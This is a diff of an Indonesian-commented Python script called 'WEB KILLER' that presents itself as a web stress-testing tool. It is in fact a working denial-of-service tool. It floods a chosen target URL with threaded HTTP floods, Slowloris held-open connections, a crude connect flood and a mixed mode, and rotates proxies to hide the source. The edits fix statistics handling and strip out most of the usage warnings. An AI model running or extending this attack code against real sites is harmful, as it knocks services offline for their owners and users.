@@ -1,8 +1,7 @@
 # -*- coding: utf-8 -*-
 #!/usr/bin/env python3
 """
-WEB KILLER v2.0 - Advanced Web Stress Testing Tool
-Untuk tujuan educational dan penetration testing yang sah
+WEB KILLER v2.1 - Advanced Web Stress Testing Tool (FIXED)
 """
 
 import sys
@@ -13,24 +12,16 @@ import requests
 import time
 import socket
 import ssl
-import json
-import hashlib
-import base64
 import urllib.parse
 import warnings
 import urllib3
-from threading import Thread, Event
+from threading import Event
 from collections import defaultdict
-from concurrent.futures import ThreadPoolExecutor
-import http.client
-import ipaddress
 
-# ===== NONAKTIFKAN WARNING SSL =====
+# Nonaktifkan warning
 warnings.filterwarnings('ignore')
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-# ===================================
 
-# Warna terminal
 class Colors:
     RED = '\033[91m'
     GREEN = '\033[92m'
@@ -43,24 +34,15 @@ class Colors:
     DIM = '\033[2m'
     END = '\033[0m'
 
-VERSION = "2.0"
+VERSION = "2.1"
 BANNER = f"""
 {Colors.RED}
 ╔══════════════════════════════════════════════════════════════╗
-║                                                              ║
-║   ██╗    ██╗███████╗██████╗     ██╗  ██╗██╗██╗     ██╗     ║
-║   ██║    ██║██╔════╝██╔══██╗    ██║ ██╔╝██║██║     ██║     ║
-║   ██║ █╗ ██║█████╗  ██████╔╝    █████╔╝ ██║██║     ██║     ║
-║   ██║███╗██║██╔══╝  ██╔══██╗    ██╔═██╗ ██║██║     ██║     ║
-║   ╚███╔███╔╝███████╗██████╔╝    ██║  ██╗██║███████╗███████╗║
-║    ╚══╝╚══╝ ╚══════╝╚═════╝     ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝║
-║                                                              ║
-║              WEB KILLER v{VERSION} - STRESS TEST              ║
-║                   CPA TOOLS DEVELOPMENT                      ║
+║   WEB KILLER v{VERSION} - STRESS TEST TOOL                    ║
+║   CPA TOOLS DEVELOPMENT                                      ║
 ╚══════════════════════════════════════════════════════════════╝
 {Colors.END}"""
 
-# Konfigurasi
 class Config:
     target_url = ''
     target_ip = ''
@@ -70,12 +52,11 @@ class Config:
     timeout = 5
     duration = 0
     method = 'GET'
-    attack_type = 'mixed'
+    attack_type = 'http'
     use_proxy = False
     proxy_file = 'proxy.txt'
     verbose = False
     delay = 0.1
-    payload_file = None
     custom_headers = {}
     post_data = None
     cookies = {}
@@ -86,17 +67,16 @@ class Config:
         'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15',
     ]
 
-# Statistik
+# Statistik - Gunakan dua dictionary terpisah
 stats = {
     'total_requests': 0,
     'success': 0,
     'failed': 0,
-    'status_codes': defaultdict(int),
     'start_time': 0,
-    'bytes_sent': 0,
-    'bytes_received': 0,
     'connections': 0,
 }
+status_codes = {}  # Gunakan dictionary biasa, bukan defaultdict
+status_lock = threading.Lock()
 
 lock = threading.Lock()
 stop_event = Event()
@@ -108,16 +88,14 @@ class WebKiller:
         self.config = Config()
         self.running = False
         self.threads = []
-        self.payloads = []
         
     def parse_args(self):
-        """Parse command line arguments"""
         try:
             import getopt
             opts, args = getopt.getopt(sys.argv[1:], 'u:t:p:d:m:a:o:v:h',
                 ['url=', 'threads=', 'timeout=', 'duration=', 'method=',
                  'attack=', 'proxy', 'verbose', 'delay=', 'data=',
-                 'header=', 'cookie=', 'payload=', 'help'])
+                 'header=', 'cookie=', 'help'])
         except getopt.GetoptError as e:
             print(f"{Colors.RED}Error: {e}{Colors.END}")
             self.show_help()
@@ -155,30 +133,21 @@ class WebKiller:
                     if '=' in cookie:
                         key, val = cookie.split('=', 1)
                         self.config.cookies[key.strip()] = val.strip()
-            elif opt == '--payload':
-                self.config.payload_file = arg
                 
         if not self.config.target_url:
             print(f"{Colors.RED}Error: URL is required!{Colors.END}")
             self.show_help()
             sys.exit(1)
             
-        # Parse URL
         parsed = urllib.parse.urlparse(self.config.target_url)
         self.config.target_ip = parsed.hostname
         self.config.target_port = parsed.port or (443 if parsed.scheme == 'https' else 80)
         self.config.use_https = parsed.scheme == 'https'
         
-        # Load proxies
         if self.config.use_proxy:
             self.load_proxies()
             
-        # Load payloads
-        if self.config.payload_file:
-            self.load_payloads()
-            
     def load_proxies(self):
-        """Load proxies from file"""
         global proxies
         try:
             if os.path.exists(self.config.proxy_file):
@@ -190,18 +159,7 @@ class WebKiller:
         except Exception as e:
             print(f"{Colors.RED}✗ Error loading proxies: {e}{Colors.END}")
             
-    def load_payloads(self):
-        """Load payloads from file"""
-        try:
-            with open(self.config.payload_file, 'r') as f:
-                self.payloads = [line.strip() for line in f if line.strip()]
-            print(f"{Colors.GREEN}✓ Loaded {len(self.payloads)} payloads{Colors.END}")
-        except Exception as e:
-            print(f"{Colors.RED}✗ Error loading payloads: {e}{Colors.END}")
-            self.payloads = []
-            
     def get_proxy(self):
-        """Get next proxy from list"""
         global proxies, current_proxy_index
         if not proxies:
             return None
@@ -213,27 +171,30 @@ class WebKiller:
         }
         
     def get_headers(self):
-        """Generate headers for request"""
         headers = {
             'User-Agent': random.choice(self.config.user_agents),
             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
             'Accept-Language': 'en-US,en;q=0.9',
             'Accept-Encoding': 'gzip, deflate, br',
             'Connection': 'keep-alive',
-            'Upgrade-Insecure-Requests': '1',
             'Cache-Control': 'no-cache',
-            'Pragma': 'no-cache',
         }
-        
         headers.update(self.config.custom_headers)
-        
         if self.config.cookies:
             headers['Cookie'] = '; '.join([f'{k}={v}' for k, v in self.config.cookies.items()])
-            
         return headers
         
+    def update_status_code(self, code):
+        """Update status code dengan aman"""
+        global status_codes
+        with status_lock:
+            if isinstance(code, int):
+                code_str = str(code)
+            else:
+                code_str = str(code)
+            status_codes[code_str] = status_codes.get(code_str, 0) + 1
+        
     def http_attack(self, thread_id):
-        """HTTP flood attack"""
         session = requests.Session()
         
         while not stop_event.is_set():
@@ -254,43 +215,36 @@ class WebKiller:
                     'allow_redirects': False,
                 }
                 
-                if self.config.method in ['POST', 'PUT', 'PATCH']:
-                    if self.config.post_data:
-                        req_kwargs['data'] = self.config.post_data
-                    elif self.payloads:
-                        req_kwargs['data'] = random.choice(self.payloads)
-                    else:
-                        req_kwargs['data'] = f'key{random.randint(1,999)}={random.randint(1,999)}'
-                        
-                start = time.time()
+                if self.config.method in ['POST', 'PUT', 'PATCH'] and self.config.post_data:
+                    req_kwargs['data'] = self.config.post_data
+                    
                 if self.config.method == 'GET':
                     r = session.get(url, **req_kwargs)
                 elif self.config.method == 'POST':
                     r = session.post(url, **req_kwargs)
                 else:
                     r = session.request(self.config.method, url, **req_kwargs)
-                    
-                elapsed = time.time() - start
                 
                 with lock:
                     stats['total_requests'] += 1
-                    stats['status_codes'][r.status_code] += 1
-                    stats['bytes_received'] += len(r.content)
                     if 200 <= r.status_code < 400:
                         stats['success'] += 1
                     else:
                         stats['failed'] += 1
-                        
+                
+                # Update status code dengan aman
+                self.update_status_code(r.status_code)
+                
                 if self.config.verbose:
-                    print(f"{Colors.DIM}[{thread_id}] {r.status_code} | {elapsed:.2f}s | {proxy or 'Direct'}{Colors.END}")
+                    print(f"{Colors.DIM}[{thread_id}] {r.status_code}{Colors.END}")
                     
-                time.sleep(self.config.delay + random.uniform(0, 0.1))
+                time.sleep(self.config.delay + random.uniform(0, 0.05))
                 
             except requests.exceptions.Timeout:
                 with lock:
                     stats['total_requests'] += 1
                     stats['failed'] += 1
-                    stats['status_codes']['TIMEOUT'] += 1
+                self.update_status_code('TIMEOUT')
                 if self.config.verbose:
                     print(f"{Colors.YELLOW}[{thread_id}] TIMEOUT{Colors.END}")
                     
@@ -298,7 +252,7 @@ class WebKiller:
                 with lock:
                     stats['total_requests'] += 1
                     stats['failed'] += 1
-                    stats['status_codes']['CONNECTION_ERROR'] += 1
+                self.update_status_code('CONN_ERR')
                 if self.config.verbose:
                     print(f"{Colors.RED}[{thread_id}] CONNECTION ERROR{Colors.END}")
                     
@@ -306,14 +260,12 @@ class WebKiller:
                 with lock:
                     stats['total_requests'] += 1
                     stats['failed'] += 1
-                    stats['status_codes']['ERROR'] += 1
+                self.update_status_code('ERROR')
                 if self.config.verbose:
                     print(f"{Colors.RED}[{thread_id}] ERROR: {str(e)[:30]}{Colors.END}")
                     
     def slowloris_attack(self, thread_id):
-        """Slowloris attack - keep connections open"""
         sockets = []
-        
         while not stop_event.is_set():
             try:
                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -331,10 +283,7 @@ class WebKiller:
                     f"GET /?{random.randint(0, 9999)} HTTP/1.1",
                     f"Host: {self.config.target_ip}",
                     f"User-Agent: {random.choice(self.config.user_agents)}",
-                    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-                    "Accept-Language: en-US,en;q=0.9",
                     "Connection: keep-alive",
-                    f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                 ]
                 
                 for _ in range(random.randint(5, 15)):
@@ -355,11 +304,14 @@ class WebKiller:
                     except:
                         pass
                         
+                with lock:
+                    stats['connections'] += 1
+                    
                 time.sleep(random.uniform(5, 15))
                 
             except Exception as e:
                 if self.config.verbose:
-                    print(f"{Colors.RED}[{thread_id}] SLOWLORIS ERROR: {str(e)[:30]}{Colors.END}")
+                    print(f"{Colors.RED}[{thread_id}] SLOWLORIS ERROR{Colors.END}")
                 time.sleep(1)
                 
         for s in sockets:
@@ -369,7 +321,6 @@ class WebKiller:
                 pass
                 
     def syn_attack(self, thread_id):
-        """SYN flood attack (simulated)"""
         while not stop_event.is_set():
             try:
                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -377,30 +328,24 @@ class WebKiller:
                 sock.connect((self.config.target_ip, self.config.target_port))
                 sock.send(b'SYN')
                 sock.close()
-                
                 with lock:
                     stats['connections'] += 1
-                    
                 time.sleep(self.config.delay)
-                
             except Exception:
                 pass
                 
     def mixed_attack(self, thread_id):
-        """Mixed attack - random attack type"""
         attacks = ['http', 'slowloris', 'syn']
         attack_functions = {
             'http': self.http_attack,
             'slowloris': self.slowloris_attack,
             'syn': self.syn_attack
         }
-        
         while not stop_event.is_set():
             attack_type = random.choice(attacks)
             attack_functions[attack_type](thread_id)
             
     def start(self):
-        """Start the attack"""
         print(f"\n{Colors.CYAN}🎯 Target: {Colors.WHITE}{self.config.target_url}{Colors.END}")
         print(f"{Colors.CYAN}🔧 Method: {Colors.WHITE}{self.config.method}{Colors.END}")
         print(f"{Colors.CYAN}💀 Attack: {Colors.WHITE}{self.config.attack_type.upper()}{Colors.END}")
@@ -432,27 +377,22 @@ class WebKiller:
             while not stop_event.is_set():
                 if self.config.duration > 0 and time.time() - stats['start_time'] > self.config.duration:
                     break
-                    
                 time.sleep(5)
                 self.show_stats()
-                
         except KeyboardInterrupt:
             print(f"\n\n{Colors.YELLOW}🛑 Stopping...{Colors.END}")
             
         self.stop()
         
     def stop(self):
-        """Stop the attack"""
         stop_event.set()
         self.running = False
-        
         for t in self.threads:
             t.join(timeout=1)
-            
         self.show_final_stats()
         
     def show_stats(self):
-        """Show current statistics"""
+        """Show statistics with safe status code display"""
         elapsed = time.time() - stats['start_time']
         with lock:
             print(f"\n{Colors.CYAN}━━━ STATISTICS ━━━{Colors.END}")
@@ -465,28 +405,29 @@ class WebKiller:
                 rps = stats['total_requests'] / elapsed if elapsed > 0 else 0
                 print(f"{Colors.WHITE}Success Rate: {Colors.GREEN}{rate:.1f}%{Colors.END}")
                 print(f"{Colors.WHITE}RPS: {Colors.GREEN}{rps:.1f}{Colors.END}")
-            if stats['status_codes']:
+            
+            # Tampilkan status codes dengan aman
+            if status_codes:
                 print(f"{Colors.WHITE}Status Codes:{Colors.END}")
-                for code, count in sorted(stats['status_codes'].items()):
-                    # PERBAIKAN: Handle both string and int codes
-                    if isinstance(code, str):
+                # Sort by key, tapi pastikan semua string
+                for code, count in sorted(status_codes.items(), key=lambda x: str(x[0])):
+                    # Tentukan warna berdasarkan kode
+                    if code in ['TIMEOUT', 'CONN_ERR', 'ERROR']:
                         color = Colors.RED
-                        display_code = code
-                    elif isinstance(code, int):
-                        if 200 <= code < 300:
+                    elif code.isdigit():
+                        code_int = int(code)
+                        if 200 <= code_int < 300:
                             color = Colors.GREEN
-                        elif 300 <= code < 400:
+                        elif 300 <= code_int < 400:
                             color = Colors.BLUE
                         else:
                             color = Colors.YELLOW
-                        display_code = str(code)
                     else:
                         color = Colors.YELLOW
-                        display_code = str(code)
-                    print(f"  {color}{display_code}: {count}{Colors.END}")
+                    print(f"  {color}{code}: {count}{Colors.END}")
                     
     def show_final_stats(self):
-        """Show final statistics"""
+        """Show final statistics with safe status code display"""
         elapsed = time.time() - stats['start_time']
         print(f"\n{Colors.CYAN}━━━ FINAL STATISTICS ━━━{Colors.END}")
         print(f"{Colors.WHITE}Total Time: {Colors.GREEN}{elapsed:.1f}s{Colors.END}")
@@ -499,83 +440,57 @@ class WebKiller:
             rps = stats['total_requests'] / elapsed if elapsed > 0 else 0
             print(f"{Colors.WHITE}Success Rate: {Colors.GREEN}{rate:.1f}%{Colors.END}")
             print(f"{Colors.WHITE}Average RPS: {Colors.GREEN}{rps:.1f}{Colors.END}")
-        if stats['status_codes']:
+        
+        # Tampilkan status codes dengan aman
+        if status_codes:
             print(f"{Colors.WHITE}Status Code Distribution:{Colors.END}")
-            for code, count in sorted(stats['status_codes'].items()):
-                # PERBAIKAN: Handle both string and int codes
-                if isinstance(code, str):
+            for code, count in sorted(status_codes.items(), key=lambda x: str(x[0])):
+                if code in ['TIMEOUT', 'CONN_ERR', 'ERROR']:
                     color = Colors.RED
-                    display_code = code
-                elif isinstance(code, int):
-                    if 200 <= code < 300:
+                elif code.isdigit():
+                    code_int = int(code)
+                    if 200 <= code_int < 300:
                         color = Colors.GREEN
-                    elif 300 <= code < 400:
+                    elif 300 <= code_int < 400:
                         color = Colors.BLUE
                     else:
                         color = Colors.YELLOW
-                    display_code = str(code)
                 else:
                     color = Colors.YELLOW
-                    display_code = str(code)
-                print(f"  {color}{display_code}: {count}{Colors.END}")
+                print(f"  {color}{code}: {count}{Colors.END}")
         print(f"\n{Colors.GREEN}✅ Web Killer Stopped!{Colors.END}\n")
         
     def show_help(self):
-        """Show help message"""
         print(f"""
-{Colors.CYAN}WEB KILLER v{VERSION} - Advanced Web Stress Testing Tool{Colors.END}
+{Colors.CYAN}WEB KILLER v{VERSION} - Stress Testing Tool{Colors.END}
 
 {Colors.GREEN}Usage:{Colors.END}
   python webkiller.py --url <URL> [options]
 
-{Colors.GREEN}Required:{Colors.END}
-  -u, --url <URL>          Target URL (e.g., http://example.com)
-
 {Colors.GREEN}Options:{Colors.END}
-  -t, --threads <NUM>      Number of threads (default: 50)
-  --timeout <SEC>          Request timeout (default: 5)
-  -d, --duration <SEC>     Duration to run (0 = unlimited)
-  -m, --method <METHOD>    HTTP method (GET, POST, etc.)
-  -a, --attack <TYPE>      Attack type: http, slowloris, syn, mixed
-  --proxy                  Use proxies from proxy.txt
-  --delay <SEC>            Delay between requests (default: 0.1)
+  -u, --url <URL>          Target URL
+  -t, --threads <NUM>      Threads (default: 50)
+  --timeout <SEC>          Timeout (default: 5)
+  -d, --duration <SEC>     Duration (0 = unlimited)
+  -m, --method <METHOD>    HTTP method
+  -a, --attack <TYPE>      http, slowloris, syn, mixed
+  --proxy                  Use proxies
+  --delay <SEC>            Delay between requests
   --data <DATA>            POST data
-  --header <H>             Custom header (format: "Key: Value")
-  --cookie <C>             Cookies (format: "key1=val1; key2=val2")
-  --payload <FILE>         Load payloads from file
+  --header <H>             Custom header
+  --cookie <C>             Cookies
   -v, --verbose            Verbose output
-  -h, --help               Show this help
-
-{Colors.GREEN}Attack Types:{Colors.END}
-  http      - Standard HTTP flood (default)
-  slowloris - Slowloris attack (keep connections open)
-  syn       - SYN flood (simulated)
-  mixed     - Random combination of attacks
+  -h, --help               Show help
 
 {Colors.GREEN}Examples:{Colors.END}
-  # Basic HTTP flood
-  python webkiller.py --url http://example.com --threads 100
-  
-  # Slowloris attack with proxies
-  python webkiller.py --url https://example.com --attack slowloris --proxy --threads 50
-  
-  # Mixed attack with duration
-  python webkiller.py --url http://example.com --attack mixed --threads 200 --duration 60
-  
-  # POST flood with custom data
-  python webkiller.py --url https://api.example.com --method POST --data "key=value" --threads 50
-
-{Colors.YELLOW}⚠️  WARNING: For educational and authorized testing only!{Colors.END}
-{Colors.RED}⚠️  Do not use for illegal purposes!{Colors.END}
-        """)
+  python webkiller.py --url https://example.com --threads 100
+  python webkiller.py --url https://example.com --attack mixed --threads 50 --duration 30
+  python webkiller.py --url https://example.com --method POST --data "key=value"
+{Colors.END}""")
 
 def main():
     print(BANNER)
-    print(f"{Colors.RED}⚠️  WARNING: For educational and authorized testing only!{Colors.END}")
-    print(f"{Colors.RED}⚠️  Do not use for illegal purposes!{Colors.END}\n")
-    
-    warnings.filterwarnings('ignore')
-    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+    print(f"{Colors.RED}⚠️  For educational and authorized testing only!{Colors.END}\n")
     
     killer = WebKiller()
     killer.parse_args()
